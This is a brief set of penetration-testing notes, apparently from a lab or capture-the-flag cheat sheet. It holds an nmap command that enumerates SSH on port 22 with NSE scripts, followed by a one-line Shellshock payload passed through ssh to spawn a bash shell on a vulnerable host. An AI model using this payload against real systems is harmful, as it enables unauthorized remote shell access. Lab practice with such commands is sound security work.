```text
# Version detection + NSE scripts
nmap -Pn -sV -p 22 --script=banner,ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -oN tcp_22_ssh_nmap.txt $ip
```

Shellshock
```
ssh -i noob noob@ip'(){:;};/bin/bash'
```